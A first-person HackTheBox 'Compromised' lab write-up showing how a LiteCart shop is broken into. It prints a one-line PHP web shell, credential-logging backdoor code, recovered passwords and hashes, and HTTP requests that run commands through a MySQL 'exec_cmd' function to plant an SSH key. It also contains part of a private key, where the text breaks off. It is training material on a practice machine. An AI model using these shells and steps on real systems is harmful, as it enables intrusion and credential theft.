---
title: "Compromised"
difficulty: Hard
os: Linux
points: 40
rating: 3.9
date: 2020-09-12
avatar: assets/htb/compromised.png
htb_url: https://app.hackthebox.com/machines/Compromised
---

## Enumeration

### Nmap scan

I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire the default enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to write the results out under the filename `<name>`.

```text
┌──(kac0㉿kali)-[~/htb/compromised]
└─$ nmap -sCV -n -p- -Pn -v <YOUR_IP>
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 15:53 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
Initiating Connect Scan at 15:53
Scanning <YOUR_IP> [65535 ports]
Discovered open port 22/tcp on <YOUR_IP>
Discovered open port 80/tcp on <YOUR_IP>
Connect Scan Timing: About 17.81% done; ETC: 15:56 (0:02:23 remaining)
Connect Scan Timing: About 37.26% done; ETC: 15:56 (0:01:43 remaining)
Connect Scan Timing: About 64.86% done; ETC: 15:56 (0:00:49 remaining)
Connect Scan Timing: About 80.09% done; ETC: 15:56 (0:00:32 remaining)
Completed Connect Scan at 15:56, 142.43s elapsed (65535 total ports)
Initiating Service scan at 15:56
Scanning 2 services on <YOUR_IP>
Completed Service scan at 15:56, 5.01s elapsed (2 services on 1 host)
NSE: Script scanning <YOUR_IP>.
Initiating NSE at 15:56
Completed NSE at 15:57, 60.01s elapsed
Initiating NSE at 15:57
Completed NSE at 15:57, 2.01s elapsed
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Nmap scan report for <YOUR_IP>
Host is up (0.0000020s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped

NSE: Script Post-scanning.
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.64 seconds
```

Just two ports were exposed: 22 - SSH and 80 - HTTP

### Port 80 - HTTP

![](assets/wu/compromised/img-1.png)

Port 80 served a shop that sells rubber duckies; 

![](assets/wu/compromised/img-2.png)

`Powered by LiteCart` - I needed to pin down the version to check for known vulnerabilities

![](assets/wu/compromised/img-3.png)

The contact details listed an email address, `admin@compromised.htb`, handing me both a candidate username and a domain name. I dropped this into my `/etc/hosts` file. 

![](assets/wu/compromised/img-4.png)

Registered an account on the site

![](assets/wu/compromised/img-5.png)

Attempting a password reset for the address I'd discovered returned a message saying it wasn't in the database. That overly verbose error could be handy later for enumerating valid users.

None of the input fields were vulnerable to SQL injection.

Running dirbuster turned up a `/backup` folder. 

![](assets/wu/compromised/img-6.png)

Inside `/backup` was an archive named `a.tar.gz`

```text
┌──(kac0㉿kali)-[~/htb/compromised]
└─$ tar -xvf a.tar.gz       
shop/
shop/.htaccess
shop/index.php
shop/images/
---snipped---
shop/admin/
shop/admin/pages.app/
shop/admin/pages.app/edit_page.inc.php
shop/admin/pages.app/pages.inc.php
shop/admin/pages.app/csv.inc.php
shop/admin/pages.app/config.inc.php
shop/admin/pages.app/index.html
shop/admin/index.php
shop/admin/catalog.app/
---snipped---
shop/pages/product.inc.php
shop/pages/feeds/
shop/pages/feeds/sitemap.xml.inc.php
shop/pages/feeds/index.html
shop/pages/order_success.inc.php
shop/pages/information.inc.php
shop/pages/checkout.inc.php
shop/pages/search.inc.php
shop/pages/order_process.inc.php
shop/pages/login.inc.php
shop/pages/edit_account.inc.php
shop/pages/categories.inc.php
shop/pages/category.inc.php
shop/pages/customer_service.inc.php
shop/pages/manufacturer.inc.php
shop/pages/order_history.inc.php
shop/pages/index.inc.php
shop/pages/logout.inc.php
shop/pages/maintenance_mode.inc.php
shop/pages/reset_password.inc.php
shop/pages/error_document.inc.php
shop/pages/printable_order_copy.inc.php
shop/pages/regional_settings.inc.php
shop/pages/create_account.inc.php
shop/pages/index.html
shop/pages/push_jobs.inc.php
shop/data/
shop/data/.htaccess
shop/data/blacklist.txt
shop/data/whitelist.txt
shop/data/bad_urls.txt
shop/data/captcha.ttf
shop/data/index.html

---snipped---
shop/.sh.php
shop/cache/
shop/cache/_cache_admin_apps_87e4038035a3612d72f7dc0e4db1f249
shop/cache/.htaccess
shop/cache/_cache_box_category_tree_348b1f1e075668ac7ea3d7cc1a70d131
shop/cache/c548260d44e24d535ba3fccc3c43ba05c7ed93f9_320x320_fwb.jpg
shop/cache/_cache_box_slides_7acb161bbf88c2463889776217f40405
shop/cache/_cache_translations_08fb7a76fe9889c7229e347fc365572b
shop/cache/583f8673ff92f9fd4c20ec8b1efe1d33c0002251_320x320_fwb.jpg
shop/cache/_cache_links_4af2ac3a6155900f3489935658237ccc
shop/cache/6de25837a78f9006034e2ebcde4f92c5a9423e0e_320x320_fwb.jpg
shop/cache/3a3f11dade5b8735b32347d7c72635cd36dfc6ee_640x640_fwb.jpg
shop/cache/_cache_box_site_footer_3cfe8cf07afa30c7ded728480aa1c4a0
shop/cache/c5515f64d0a81ec44e9546d16d45997424b22830_0x60_f.png
shop/cache/_cache_admin_widgets_7e6025d3c49df3bb009befb1e7d11de7
shop/cache/_cache_translations_a5cffc86b04ab3f12f6c4bbcc7089c0a
shop/cache/c548260d44e24d535ba3fccc3c43ba05c7ed93f9_640x640_fwb.jpg
shop/cache/83bc2f1a42a15397099d43cb6485bd45fbc94701_320x320_fwb.jpg
shop/cache/_cache_box_latest_products_3525edd76b7337df655e2836de07dae6
shop/cache/_cache_box_site_menu_927c4e77d649c0caf82035ca4a2deae5
shop/cache/_cache_box_manufacturer_logotypes_09265003c2d15fc1f6b0585970484255
shop/cache/c5515f64d0a81ec44e9546d16d45997424b22830_0x30_f.png
shop/cache/_cache_widget_discussions_8b2f549ef58aea26d2e520c67c774ec6
shop/cache/_cache_widget_addons_a0c61a130a70a3f9a268e4de8ceefed7
shop/cache/3a3f11dade5b8735b32347d7c72635cd36dfc6ee_320x320_fwb.jpg
shop/cache/6de25837a78f9006034e2ebcde4f92c5a9423e0e_640x640_fwb.jpg
shop/cache/_cache_box_campaign_products_12a69b81ba2893c250481876b44689ef
shop/cache/83bc2f1a42a15397099d43cb6485bd45fbc94701_640x640_fwb.jpg
shop/cache/_cache_box_popular_products_ae023d8d43ee40f30f421b5074672c14
shop/cache/_cache_widget_graphs_ac212c15101de56b09819c0fc75e10c8
shop/cache/_cache_links_3416e6563a45c12fd74c3f251f5c0368
shop/cache/583f8673ff92f9fd4c20ec8b1efe1d33c0002251_640x640_fwb.jpg
shop/cache/index.html
shop/cache/4f7c546191e44cdaa756f2794c7cb01451ab17bb_24x24_c.png
shop/robots.txt
shop/favicon.ico
shop/ext/
---snipped---
shop/ext/index.html
```

This appeared to be a full backup of the site's directory tree. There was bound to be something useful inside, but a lot of files to sift through. After digging around for a while it became clear the site had been compromised at some point, because the backup shipped with a PHP backdoor.

```text
┌──(kac0㉿kali)-[~/htb/compromised/shop]
└─$ cat robots.txt                                  
User-agent: *
Allow: /
Disallow: */cache/*
Sitemap: /feeds/sitemap.xml

┌──(kac0㉿kali)-[~/htb/compromised/shop]
└─$ cat .sh.php    
<?php system($_REQUEST['cmd']); ?>
```

Neither `robots.txt` nor `sitemap.xml` were present on the live site - maybe they were stripped out after the compromise?

![](assets/wu/compromised/img-7.png)

![](assets/wu/compromised/img-8.png)

Edit after finishing: these files do in fact exist - I'd been checking the web root instead of the **`/shop`** directory.

```text
┌──(kac0㉿kali)-[~/htb/compromised/shop/admin]
└─$ grep -r pass                                                                 
admin/login.php:    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
```

![](assets/wu/compromised/img-9.png)

![](assets/wu/compromised/img-10.png)

The `/admin` folder seemed like a sensible starting point. I grepped the files for passwords, and 

![](assets/wu/compromised/img-11.png)

the admin folder's login page referenced a log file that usernames and passwords were being written to

```text
┌──(kac0㉿kali)-[~/htb/compromised/shop/admin]
└─$ ls -la
total 116
drwxr-xr-x 24 kac0 kac0 4096 Sep  3 07:50 .
drwxr-xr-x 11 kac0 kac0 4096 May 28  2020 ..
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 addons.widget
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 appearance.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 catalog.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 countries.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 currencies.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 customers.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 discussions.widget
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 geo_zones.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 graphs.widget
-rw-r--r--  1 kac0 kac0 6460 May 14  2018 index.php
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 languages.app
-rw-r--r--  1 kac0 kac0 1364 Sep  3 07:50 login.php
-rw-r--r--  1 kac0 kac0  203 May 14  2018 logout.php
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 modules.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 orders.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 orders.widget
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 pages.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 reports.app
-rw-r--r--  1 kac0 kac0 4094 May 14  2018 search_results.json.php
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 settings.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 slides.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 stats.widget
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 tax.app
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 translations.app
drwxr-xr-x  2 kac0 kac0 4096 May 28  2020 users.app
drwxr-xr-x  2 kac0 kac0 4096 May 28  2020 vqmods.app
```

`login.php` had a more recent modification time than the rest of the files here, likely from commenting out that line

```text
┌──(kac0㉿kali)-[~/htb/compromised/shop/includes]
└─$ ls -la
total 80
drwxr-xr-x 11 kac0 kac0 4096 May 28  2020 .
drwxr-xr-x 11 kac0 kac0 4096 May 28  2020 ..
-rw-r--r--  1 kac0 kac0 1955 May 14  2018 app_footer.inc.php
-rw-r--r--  1 kac0 kac0  996 May 14  2018 app_header.inc.php
-rw-r--r--  1 kac0 kac0 1808 May 14  2018 autoloader.inc.php
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 boxes
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 classes
-rw-r--r--  1 kac0 kac0 6064 May 14  2018 compatibility.inc.php
-rw-r--r--  1 kac0 kac0 9376 May 28  2020 config.inc.php
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 controllers
-rw-r--r--  1 kac0 kac0 2537 May 14  2018 error_handler.inc.php
drwxr-xr-x  2 kac0 kac0 4096 May 28  2020 functions
-rw-r--r--  1 kac0 kac0    0 May 14  2018 index.html
drwxr-xr-x  2 kac0 kac0 4096 Sep  3 07:49 library
drwxr-xr-x  8 kac0 kac0 4096 May 14  2018 modules
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 references
drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 routes
drwxr-xr-x  4 kac0 kac0 4096 May 14  2018 templates
```

The `/includes/library` folder was likewise modified on Sep 3

```text
┌──(kac0㉿kali)-[~/…/compromised/shop/includes/library]
└─$ ls -la
total 200
drwxr-xr-x  2 kac0 kac0  4096 Sep  3 07:49 .
drwxr-xr-x 11 kac0 kac0  4096 Dec 26 18:26 ..
-rw-r--r--  1 kac0 kac0     0 May 14  2018 index.html
-rw-r--r--  1 kac0 kac0  1372 May 14  2018 lib_breadcrumbs.inc.php
-rw-r--r--  1 kac0 kac0  9237 May 14  2018 lib_cache.inc.php
-rw-r--r--  1 kac0 kac0 15785 May 14  2018 lib_cart.inc.php
-rw-r--r--  1 kac0 kac0   297 May 14  2018 lib_catalog.inc.php
-rw-r--r--  1 kac0 kac0   890 May 14  2018 lib_compression.inc.php
-rw-r--r--  1 kac0 kac0  8068 May 14  2018 lib_currency.inc.php
-rw-r--r--  1 kac0 kac0 12441 May 14  2018 lib_customer.inc.php
-rw-r--r--  1 kac0 kac0  6931 May 14  2018 lib_database.inc.php
-rw-r--r--  1 kac0 kac0 11532 May 14  2018 lib_document.inc.php
-rw-r--r--  1 kac0 kac0  1640 May 14  2018 lib_form.inc.php
-rw-r--r--  1 kac0 kac0   379 May 14  2018 lib_functions.inc.php
-rw-r--r--  1 kac0 kac0 12236 May 14  2018 lib_language.inc.php
-rw-r--r--  1 kac0 kac0  2939 May 14  2018 lib_length.inc.php
-rw-r--r--  1 kac0 kac0  7690 May 14  2018 lib_link.inc.php
-rw-r--r--  1 kac0 kac0  2002 May 14  2018 lib_notices.inc.php
-rw-r--r--  1 kac0 kac0  2787 May 14  2018 lib_reference.inc.php
-rw-r--r--  1 kac0 kac0  8388 May 14  2018 lib_route.inc.php
-rw-r--r--  1 kac0 kac0 10894 May 14  2018 lib_security.inc.php
-rw-r--r--  1 kac0 kac0  2256 May 14  2018 lib_session.inc.php
-rw-r--r--  1 kac0 kac0  2413 May 14  2018 lib_settings.inc.php
-rw-r--r--  1 kac0 kac0  3508 May 14  2018 lib_stats.inc.php
-rw-r--r--  1 kac0 kac0  7227 May 14  2018 lib_tax.inc.php
-rw-r--r--  1 kac0 kac0  8317 Sep  3 07:49 lib_user.inc.php
-rw-r--r--  1 kac0 kac0  4218 May 14  2018 lib_volume.inc.php
-rw-r--r--  1 kac0 kac0  2371 May 14  2018 lib_weight.inc.php
```

Going through this folder led me to `lib_user.inc.php`. It too had been changed on September 3 and referenced the same hidden log file.

![](assets/wu/compromised/img-12.png)

![](assets/wu/compromised/img-13.png)

searching the remaining folders surfaced a password hash in `includes/config.inc.php` 

```text
includes/config.inc.php:  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
```

I threw this hash at hashcat but couldn't crack it.

![](assets/wu/compromised/img-14.png)

The same file also held likely database credentials along with the names of every table

```text
┌──(kac0㉿kali)-[~/htb/compromised/shop]
└─$ grep -ir .log2301c9430d8593ae.txt
admin/login.php:    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
includes/library/lib_user.inc.php:      //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $username . " Passwd: " . $password);
```

After a detour chasing potential passwords and hashes, I returned to the modified files. Both pointed at the same hidden log file, and both had been touched on Sep 3

```text
┌──(kac0㉿kali)-[~/htb/compromised/shop]
└─$ find . -newermt "Sep 3"              
./admin
./admin/login.php
./admin/users.app
./includes
./includes/library
./includes/library/lib_user.inc.php
```

Only a handful of files were changed that day; nothing inside `/admin/users.app/` had been modified then, which suggested something had probably been deleted from it

![](assets/wu/compromised/img-15.png)

Browsing directly to the log file revealed admin credentials inside it: `User: admin Passwd: theNextGenSt0r3!~`

![](assets/wu/compromised/img-16.png)

I used these creds to log into the admin page; 

once authenticated I saw a notable message along the lines of: "The last time you logged in was at IP 10.10.14.27. If this was not you your credentials may have been compromised". The message vanished before I could grab a screenshot. 

![](assets/wu/compromised/img-17.png)

A banner also warned that the admin account wasn't `.htpasswd` protected

![](assets/wu/compromised/fix-37.png)

In the bottom corner of the page I spotted that the LiteCart version was 2.1.2, so I checked for any known vulnerabilities tied to that release

* [https://medium.com/@foxsin34/litecart-2-1-2-arbitrary-file-upload-authenticated-1b962df55a45](https://medium.com/@foxsin34/litecart-2-1-2-arbitrary-file-upload-authenticated-1b962df55a45)
* [https://www.exploit-db.com/exploits/45267](https://www.exploit-db.com/exploits/45267)

```python
'-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
```

The exploit required admin credentials plus the admin login page path, both of which I already had. Unfortunately it was written for python2, so I had to massage it a little to get it running

[https://stackoverflow.com/questions/8405096/python-3-2-cookielib](https://stackoverflow.com/questions/8405096/python-3-2-cookielib)

```text
┌──(kac0㉿kali)-[~/htb/compromised]
└─$ python3 litecart_exploit.py -t http://<YOUR_IP>/shop/admin -u admin -p 'theNextGenSt0r3!~'
Sorry something went wrong
```

hmmm...so I read through the python exploit's code and attempted the exploitation by hand.

![](assets/wu/compromised/img-19.png)

Uploaded files had to carry an `.xml` extension.

![](assets/wu/compromised/img-20.png)

By disguising my web-shell as an xml file with burp, I managed to upload it and reach it

![](assets/wu/compromised/img-21.png)

 The upload succeeded

![](assets/wu/compromised/fix-38.png)

No commands would execute - every one timed out, leading me to suspect a firewall or similar was blocking them

* [https://www.thoughtco.com/what-version-of-php-running-2694207](https://www.thoughtco.com/what-version-of-php-running-2694207)

### Enumeration through `phpinfo()`

![](assets/wu/compromised/img-23.png)

I used the `phpinfo()` method to identify the server's PHP version and was rewarded with an enormous dump of data - pages upon pages of configuration and environment details about the server and its current runtime context. version 7.2.24-0ubuntu0.18.04.6

![](assets/wu/compromised/img-24.png)

Further details - the user context is www-data

![](assets/wu/compromised/img-25.png)

Information overload

### The PHP `disabled_functions`

![](assets/wu/compromised/img-26.png)

Reading carefully through the output, I came across a "disabled functions" section that listed every code execution method I was aware of 

![](assets/wu/compromised/img-27.png)

A large number of functions were disabled. Most were related to code execution one way or another, alongside a few intriguing php functions I'd never heard of...not that I could use them here anyway

```php
system,passthru,popen,shell_exec,proc_open,exec,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
```

I hunted for a vulnerability in this PHP version that might let me re-enable functions or work around the restriction, and turned up

* [https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable\_functions-in-php-installations-6ccdbf4f52bb/](https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable_functions-in-php-installations-6ccdbf4f52bb/)
* [https://www.netsparker.com/blog/web-security/bypass-disabled-system-functions/](https://www.netsparker.com/blog/web-security/bypass-disabled-system-functions/)
* [https://github.com/Bo0oM/PHP\_imap\_open\_exploit/blob/master/exploit.php](https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php)
* [https://www.sudokaikan.com/2019/10/bypass-disablefunctions-in-php-by-json.html](https://www.sudokaikan.com/2019/10/bypass-disablefunctions-in-php-by-json.html)
* [https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php](https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php)

The last one only works up to 7.2.19,

* [https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)

but the same author had another that worked up to 7.3; I tweaked the PoC so I could feed it arbitrary commands, uploaded it, and gave it a try.

![](assets/wu/compromised/img-28.png)

It worked! I now had code execution, running as `www-data`

![](assets/wu/compromised/img-29.png)

Read `/etc/passwd` - three accounts could log in: sysadmin, mysql, and root

### The `mysql` daemon

![](assets/wu/compromised/img-30.png)

Looking at `ps aux`, I saw mysqld was running. Since I'd already seen the tables and login info earlier, maybe I could enumerate the database

![](assets/wu/compromised/img-31.png)

I looked into which configuration files existed for mysqld

![](assets/wu/compromised/img-32.png)

Discovered a way to run shell commands through mysql

* [https://electrictoolbox.com/run-single-mysql-query-command-line/](https://electrictoolbox.com/run-single-mysql-query-command-line/)
* [https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html](https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html)

If it could be done at all, perhaps it could be done from the command line too

![](assets/wu/compromised/img-33.png)

Listed the databases

![](assets/wu/compromised/img-34.png)

`GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"show+tables"+ecom HTTP/1.1`

Enumerated the tables within the `ecom` database.

![](assets/wu/compromised/fix-39.png)

achieved code execution with `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"system+id"+ecom HTTP/1.1`

I had to pass -e to run SQL, use system for OS commands, and finish the line with the database name 'ecom'

The catch was that I was still executing as `www-data`, so I needed a way to escalate; the mysql reference had something interesting about user-defined variables

> User-defined variables are session specific. A user variable defined by one client cannot be seen or used by other clients.

[https://dev.mysql.com/doc/refman/8.0/en/performance-schema-user-defined-functions-table.html](https://dev.mysql.com/doc/refman/8.0/en/performance-schema-user-defined-functions-table.html)

There was also a section covering user-defined functions

```text
--------------
show tables
--------------

Tables_in_mysql
columns_priv
db
engine_cost
event
func
general_log
gtid_executed
help_category
help_keyword
help_relation
help_topic
innodb_index_stats
innodb_table_stats
ndb_binlog_index
plugin
proc
procs_priv
proxies_priv
server_cost
servers
slave_master_info
slave_relay_log_info
slave_worker_info
slow_log
tables_priv
time_zone
time_zone_leap_second
time_zone_name
time_zone_transition
time_zone_transition_type
user
```

I began poking around the `mysql` database

```text
--------------
select * from user
--------------

Host    User    Select_priv    Insert_priv    Update_priv    Delete_priv    Create_priv    Drop_priv    Reload_priv    Shutdown_priv    Process_priv    File_priv    Grant_priv    References_priv    Index_priv    Alter_priv    Show_db_priv    Super_priv    Create_tmp_table_priv    Lock_tables_priv    Execute_priv    Repl_slave_priv    Repl_client_priv    Create_view_priv    Show_view_priv    Create_routine_priv    Alter_routine_priv    Create_user_priv    Event_priv    Trigger_priv    Create_tablespace_priv    ssl_type    ssl_cipher    x509_issuer    x509_subject    max_questions    max_updates    max_connections    max_user_connections    plugin    authentication_string    password_expired    password_last_changed    password_lifetime    account_locked
localhost    root    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y                    0    0    0    0    mysql_native_password    *C890DD6B4A77DC26B05EB1EE1E458A3E374D3E5B    N    2020-05-09 02:15:14    NULL    N
localhost    mysql.session    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    Y    N    N    N    N    N    N    N    N    N    N    N    N    N                    0    0    0    0    mysql_native_password    *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE    N    2020-05-08 16:02:15    NULL    Y
localhost    mysql.sys    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N    N                    0    0    0    0    mysql_native_password    *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE    N    2020-05-08 16:02:15    NULL    Y
localhost    debian-sys-maint    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y                    0    0    0    0    mysql_native_password    *7CDDF050D9C0BC9EB6FDFE3C9CBC1E5F852A9F7A    N    2020-05-08 16:02:16    NULL    N
```

Recovered the mysql root user's credentials

```text
--------------
select * from func
--------------

name    ret    dl    type
exec_cmd    0    libmysql.so    function
```

The `func` table in the `mysql` database held a single function named `exec_cmd`. Calling it directly didn't work, but after some experimentation I realized it had to be invoked via the `SELECT` SQL command.

![](assets/wu/compromised/img-36.png)

`GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('id')"+mysql HTTP/1.1`

The results showed the function was executing as the `mysql` user. Knowing that account could log in, I went to append my SSH public key to its `.ssh/authorized_keys` file so I could SSH in.

![](assets/wu/compromised/img-37.png)

`GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('echo+ecdsa-sha2-nistp256+AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLNqKR/rHfuv30j7eOmU85z%2bEKhPfUFtn9WEARBZzwF6LFTCgjZzqAF0GevT3b22Z5iqwETgfF%2bQcmjAw3Ld9VY%3d+>>+~/.ssh/authorized_keys')"+mysql HTTP/1.1`

## Initial Foothold

### Enumeration as `mysql`

```text
┌──(kac0㉿kali)-[~/htb/compromised]
└─$ ssh mysql@<YOUR_IP> -i compromised.key                                                     130 ⨯
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
mysql@compromised:~$ id && hostname
uid=111(mysql) gid=113(mysql) groups=113(mysql)
compromised
mysql@compromised:~$ ls -la
total 189280
drwx------  9 mysql mysql     4096 Dec 25 05:48 .
drwxr-xr-x 43 root  root      4096 May 24  2020 ..
-rw-r-----  1 mysql mysql       56 May  8  2020 auto.cnf
lrwxrwxrwx  1 root  root         9 May  9  2020 .bash_history -> /dev/null
-rw-------  1 mysql mysql     1680 May  8  2020 ca-key.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 ca.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 client-cert.pem
-rw-------  1 mysql mysql     1676 May  8  2020 client-key.pem
-rw-r--r--  1 root  root         0 May  8  2020 debian-5.7.flag
drwxr-x---  2 mysql mysql    12288 May 28  2020 ecom
drwx------  3 mysql mysql     4096 May  9  2020 .gnupg
-rw-r-----  1 mysql mysql      527 Sep 12 19:57 ib_buffer_pool
-rw-r-----  1 mysql mysql 79691776 Dec 25 05:48 ibdata1
-rw-r-----  1 mysql mysql 50331648 Dec 25 05:48 ib_logfile0
-rw-r-----  1 mysql mysql 50331648 May 27  2020 ib_logfile1
-rw-r-----  1 mysql mysql 12582912 Dec 27 16:47 ibtmp1
drwxrwxr-x  3 mysql mysql     4096 May  9  2020 .local
drwxr-x---  2 mysql mysql     4096 May  8  2020 mysql
lrwxrwxrwx  1 root  root         9 May 13  2020 .mysql_history -> /dev/null
drwxr-x---  2 mysql mysql     4096 May  8  2020 performance_schema
-rw-------  1 mysql mysql     1680 May  8  2020 private_key.pem
-rw-r--r--  1 mysql mysql      452 May  8  2020 public_key.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 server-cert.pem
-rw-------  1 mysql mysql     1680 May  8  2020 server-key.pem
drwxrwxr-x  2 mysql mysql     4096 Sep  3 11:52 .ssh
-r--r-----  1 root  mysql   787180 May 13  2020 strace-log.dat
drwxr-x---  2 mysql mysql    12288 May  8  2020 sys
mysql@compromised:~$ pwd
/var/lib/mysql
mysql@compromised:~$ cat /home/mysql/user.txt
cat: /home/mysql/user.txt: No such file or directory
mysql@compromised:~$ cd /home
mysql@compromised:/home$ ls -la
total 12
drwxr-xr-x  3 root root     4096 May 13  2020 .
drwxr-xr-x 24 root root     4096 Sep  9 12:02 ..
drwxr-x---  2 root sysadmin 4096 Aug 31 03:16 sysadmin
```

The SSH key injection worked and I logged into the box as `mysql`, but there was no `user.txt` anywhere. I'd evidently need to pivot laterally to `sysadmin` first.

```text
mysql@compromised:~$ cat private_key.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqTt5K2NQkYThnQvJNka1k5tHjVOh6ZhdN5k4ThY9V3Fhq1MI
Zl6sJPMLI/Ub9Xwjn1Ucyxs+P0h5kk8Ozx/EnXVmJBemkTBgpakh5NNf8MAhkpmn
Ng/jc/T1AUmq8lgt3+2X/5TnvH/DWape8f1TmnCCmIzBGUUKzdD+K+ojNq/Ii3JI
WVxm3o/HxerQHwmrc7rEtLOQIKym7rRF5tMrdhacoOFkxSsvO7/juAdfv941yl4d
7Q8kOtmd2R4XO8d8CLEjcyiSC1SJ8nfd3pvjIoxeKFRETgbSZHTcxUbhREjaBzms
kWB3w3Gij+y+BefUAqCX5F1+OCtGMFoBahHCHQIDAQABAoIBAQCAbNepK3cK13J3
QWhyvfoxh9cm0t6+bJfhB2+JIqtuXmamIx7uwM2WRLKhmPKcupY15dsx7vyv/Yn0
k/ZDDHKio2Ld5OzMpY/SZ6WHBzl5c/SGUgBosGoFp1D+py8JNg2qL533oMKzc6mF
tBrVPU9ilhslNTuct55ZTk50ePw8FLIJHIpd7Ng2Z1oVGUKz1WXmZoVhnxPCxYSQ
smkWKQuSoykWfaOZ7mGev64e/O4jsq4CQvo2MI89cXLW4N5tfBJZvGelN4kylEM/
55T7Mmy5P4R6fzc9/auMTktIERh9m3St7EvtRApqLH3otZXG1vnesYoWK5yUltBG
z0RZT7VpAoGBANIRMWcg5DiDu5nG/ijuRp3CNChbMdXQvmQnCv0MVchnQ3Pr9MUT
n/J9hL+EBYRxJL1O7Mer/UanX/eVMT14/JNDaaR1uOVVwWUKKh3lKNDBF4cyT4cu
pVL+dm7NElkoNYuLzJPXM/DvyWfIqKC2/9AVcPvvNouFVivJJh4W05kfAoGBAM48
